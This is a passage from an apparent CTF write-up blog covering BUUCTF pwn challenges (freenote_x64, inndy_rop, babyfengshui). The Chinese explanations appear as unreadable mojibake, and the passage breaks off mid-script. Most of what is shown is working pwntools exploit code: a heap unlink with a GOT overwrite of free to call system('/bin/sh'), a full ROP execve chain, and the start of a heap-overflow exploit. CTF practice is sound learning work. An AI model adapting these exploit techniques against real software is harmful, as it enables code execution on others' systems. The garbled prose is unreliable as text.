å†™å…¥ä¸ä¹‹å‰ç”³è¯·ä¸åŒ¹é…çš„sizeï¼Œé‚£ä¹ˆä¼šè°ƒç”¨reallocæ‰©å……å †å—çš„sizeï¼Œä¼¼ä¹å¯ä»¥é€ æˆoverlap</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200603042-16316211674692.png" alt="image-20210914200603042"></p><p>freeåŠŸèƒ½çš„è¯ï¼Œå †ç»“æ„é‡Œé¢çš„æŒ‡é’ˆæ²¡æœ‰æ¸…é›¶ï¼Œå­˜åœ¨UAFã€‚ä½†æ˜¯å‰é¢çš„flagã€sizeéƒ½æ¸…é›¶äº†ï¼Œæ‰€ä»¥åªèƒ½double free</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914202759594.png" alt="image-20210914202759594"></p><p>æœ‰ä¸ªæ³¨æ„ç‚¹æ˜¯åœ¨ç”³è¯·å †å—ä¸­çš„è¾“å…¥å †å—å†…å®¹æ—¶ï¼Œä½ è¾“å…¥å¤šå¤§çš„sizeï¼Œé‚£ä½ ç›¸åº”å°±è¦å¡«å…¥å¤šå¤§çš„å­—ç¬¦ï¼Œå¦åˆ™è¿™è¾¹çš„readæ˜¯ä¸ä¼šåœæ­¢çš„</p><p>æ€è·¯ï¼šå°±å…ˆchecksecçœ‹åˆ°çš„ï¼Œå»åŠ«æŒgotè¡¨ï¼Œä¸€èˆ¬æ˜¯freeï¼Œç„¶åå†å»é‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º/bin/shçš„å †å—ã€‚è¿™é¢˜å †å—å†…å®¹æ²¡æœ‰æ¸…ç©ºï¼Œå¹¶ä¸”ç”³è¯·å †å—æ—¶è¾“å…¥çš„æ•°æ®æ˜¯å¯ä»¥ä¸è¾“å…¥\x00çš„ï¼Œæ‰€ä»¥ä¸ä¼šæˆªæ–­ï¼Œé‚£å°±è¯´æ˜è•´å«ç€å¾ˆå¤šè„æ•°æ®éƒ½æ˜¯å¯ä»¥æ³„éœ²çš„ï¼æ¯”å¦‚libcï¼Œæ¯”å¦‚å †åœ°å€ï¼Œè€Œå¦‚æœæœ‰äº†å †åœ°å€ï¼Œunlinkï¼Œéšä¹‹è€Œæ¥ï¼Œç„¶åPIEåˆæ²¡å¼€ï¼Œç›´æ¥å†™gotè¡¨åœ°å€ï¼Œç„¶åå†™å…¥systemåœ°å€å³å¯ï¼</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914204249244.png" alt="image-20210914204249244"></p><p>è¿™è¾¹é‡Šæ”¾å †å—è¦æ³¨æ„ï¼Œå¾—å…ˆç”³è¯·å››ä¸ªï¼Œç„¶åéš”ç€é‡Šæ”¾ï¼Œå› ä¸ºéƒ½æ˜¯unsorted chunkï¼Œå¾—è¦é˜²æ­¢è§¦å‘unlinkåˆå¹¶</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914211338216.png" alt="image-20210914211338216"></p><p>é‡Šæ”¾å®Œå››ä¸ªå †å—åï¼Œæœ‰æ®‹ä½™è„æ•°æ®çš„å †ç»“æ„ï¼Œç°åœ¨å°±è¦ä¾æ®è¿™ä¸ªè„æ•°æ®è¿›è¡Œæ„é€ unlink</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914212020955.png" alt="image-20210914212020955"></p><p>å¾ˆæ˜æ˜¾ï¼Œç”³è¯·å‡ºæ¥çš„ï¼Œåªèƒ½åœ¨ç¬¬ä¸‰ä¸ªå †åœ°å€ä¸Šä¼ªé€ å‡ºå †å¤´ï¼Œè¿™æ ·æ‰èƒ½é‡Šæ”¾è¯¥ä¼ªé€ å †å—ï¼Œè§¦å‘unlink</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210915103319358.png" alt="image-20210915103319358"></p><p>unlinkæˆåŠŸï¼ŒæŠŠå †å—æŒ‡é’ˆçš„å€¼å˜ä¸ºäº†å †ç»“æ„ä¸Šçš„åœ°å€ï¼Œä¹‹åç›´æ¥å¯¹ç€å †ç»“æ„ä¿®æ”¹å³å¯</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210915110109421.png" alt="image-20210915110109421"></p><p>getshellï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./freenote_x64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27343</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Length of new note: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Length of note: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Enter your note: &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0 </span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>) <span class="hljs-comment">#å› ä¸ºä¼šå‡‘é½0x80çš„å¤§å°ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ç›¸å½“äºç”³è¯·å‡º0x80çš„å †</span><br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;0. aaaaaaaa&quot;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">6464</span> <span class="hljs-comment">#æ¥æ”¶å››ä¸ªï¼Œæ˜¯å› ä¸ºæ‰“è¿œç¨‹æ—¶ï¼Œå‘ç°å †åœ°å€å°±æ˜¯å››ä¸ªå­—èŠ‚çš„</span><br>log.success(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>p.recvuntil(<span class="hljs-string">&quot;2. bbbbbbbb&quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#æ¸…ç©ºå †å—ï¼Œä¸ºäº†åç»­å€Ÿç”¨UAFè¿›è¡Œunlink</span><br><br><span class="hljs-comment">#unlink</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x110</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x18</span>) + p64(heap_base + <span class="hljs-number">0x30</span> - <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x110</span>) + p64(<span class="hljs-number">0x90</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) <br>add(<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">2</span>)<br><br>free = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>payload = p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x8</span>) + p64(free)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x8</span>,p64(system))<br>add(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note number: &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))   <span class="hljs-comment">#ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿™é‡Œä¸è¿™æ ·è¾“å…¥ï¼Œæ²¡åŠæ³•getshell</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€inndy-rop"><a href="#ä¸‰ã€inndy-rop" class="headerlink" title="ä¸‰ã€inndy_rop"></a>ä¸‰ã€inndy_rop</h2><p>å…ˆchecksecä¸€ä¸‹ï¼Œ32ä½ï¼Œåªå¼€äº†nx</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202233200.png" alt="image-20210823202233200"></p><p>è¿›å…¥idaï¼Œç¨‹åºå¾ˆç®€å•ï¼Œåªæœ‰ä¸€ä¸ªgetså‡½æ•°ï¼Œæ˜æ˜¾æº¢å‡º</p><p>ç„¶åç¨‹åºä¸œè¥¿å¾ˆç¹æ‚ï¼Œè¿™ç§å°±æ˜¯å±äºé™æ€ç¼–è¯‘çš„ç¨‹åºï¼Œç¨‹åºé‡Œé¢åŒ…å«ç€ç¨‹åºæ‰€éœ€è¦çš„å‡½æ•°ä¿¡æ¯ï¼Œä½†æ˜¯æ‰¾äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰æ‰¾åˆ°/bin/shï¼Œä»¥åŠsystemï¼Œé‚£åº”è¯¥å°±æ˜¯è¦æ„é€ gadgetsäº†ï¼Œå»ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å·å‡½æ•°è·å–shell</p><img src="/2021/08/12/2021-08-12-buu07/image-20210823195230792.png" alt="image-20210823195230792" style="zoom:80%;"><p>ç™¾åº¦äº†ä¸€ä¸‹ï¼ŒROPgadgetå†…ç½®äº†ç›¸å…³å·¥å…·ï¼Œå¯ä»¥ç›´æ¥é’ˆå¯¹è¿™ç§é¢˜ç›®æœ‰ç°æˆçš„exp</p><p><code>ROPgadget --binary rop --ropchain</code></p><img src="/2021/08/12/2021-08-12-buu07/image-20210823195052520.png" alt="image-20210823195052520" style="zoom:80%;"><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201506833.png" alt="image-20210823201506833"></p><p>è¿™è¾¹å…¶å®è¿˜æœ‰ç§åŠæ³•ï¼Œå°±æ˜¯ä½¿ç”¨mprotectå‡½æ•°ä¿®æ”¹.bssæ®µçš„æ‰§è¡Œæƒé™ï¼Œç„¶åå†™å…¥shellcodeï¼Œå†æ‰§è¡Œæ¥getshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823201429425.png" alt="image-20210823201429425"></p><p>ç¨‹åºé‡Œé¢æ˜¯æœ‰mprotectå‡½æ•°çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29804</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">16</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br><br>r.sendline(p)<br>r.interactive()<br>r.close()<br></code></pre></td></tr></table></figure><h2 id="å››ã€babyfengshui-33c3-2016"><a href="#å››ã€babyfengshui-33c3-2016" class="headerlink" title="å››ã€babyfengshui_33c3_2016"></a>å››ã€babyfengshui_33c3_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823202142271.png" alt="image-20210823202142271"></p><p>checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†NXã€Canary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210823231658268.png" alt="image-20210823231658268"></p><p>æ¼æ´ç‚¹åœ¨äºä¿®æ”¹å †å—å†…å®¹é‡Œé¢çš„æ£€æŸ¥æœºåˆ¶æœ‰é—®é¢˜ï¼šåªè¦æŠŠä¸¤ä¸ªå †å—åˆ†å¼€ï¼Œä¸€ä¸ªåœ¨å¤´ä¸€ä¸ªåœ¨å°¾ï¼Œé‚£å°±ä»£è¡¨ç€èƒ½æº¢å‡ºè¦†ç›–ä¸¤ä¸ªå †å—é—´çš„æ‰€æœ‰å †å—ã€‚è€Œä¸”è¿™å¾ˆå®¹æ˜“å°±èƒ½åŠåˆ°ï¼Œåªè¦è¿ç»­ç”³è¯·å‡ æ¬¡å †å—ï¼ŒæŠŠæœ€å¼€å§‹ç”³è¯·çš„é‡Šæ”¾äº†ï¼Œç„¶åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªè¢«é‡Šæ”¾å¤§å°çš„å †å—ï¼Œé‚£è¿™ä¸ªå †å—å°±å‡ºç°åœ¨äº†å¤´éƒ¨ï¼Œè€Œå¦ä¸€ä¸ªå°±æ˜¯åœ¨å°¾éƒ¨</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827142300094.png" alt="image-20210827142300094"></p><p>è€Œæ‰“å°å‡½æ•°ï¼Œè®¤çœŸçœ‹ï¼Œæ˜¯printfå‡½æ•°ï¼Œ%sï¼Œé‚£ä¹ˆè¿™æ˜¯ä¼šè§£æä¸€ä¸ªåœ°å€ï¼Œç„¶åæŠŠè¿™ä¸ªåœ°å€ä¸Šçš„å†…å®¹æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡æº¢å‡ºæŠŠfreeçš„gotè¡¨åœ°å€å†™ä¸Šå»ï¼Œé‚£ä¹ˆè§£æå®Œæ‰“å°å‡ºæ¥çš„å°±æ˜¯freeçš„çœŸå®åœ°å€ï¼Œä»è€Œè·å¾—libcåŸºå€</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143043150.png" alt="image-20210827143043150"></p><p>åŒæ ·ï¼Œè¿™è¾¹ä¿®æ”¹descriptionçš„å‡½æ•°ï¼Œä¹Ÿæ˜¯ä¼šæŠŠdescriptionçš„åœ°å€ä¼ å…¥è¿›å»ä¿®æ”¹ï¼Œé‚£ä¹ˆåªéœ€è¦å¯¹ç€å‰é¢å·²ç»å†™å…¥freeçš„gotè¡¨åœ°å€çš„å †å—è¿›è¡Œè¿™ä¸ªæ“ä½œï¼Œå°±èƒ½æŠŠsystemå‡½æ•°å†™è¿›å»ï¼Œä»è€ŒåŠ«æŒgotè¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 27980)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, length, text</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;description: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Dis</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upd</span>(<span class="hljs-params">index, length, text</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x8</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>Del(<span class="hljs-number">0</span>)<br>Add(<span class="hljs-number">0x100</span>,<span 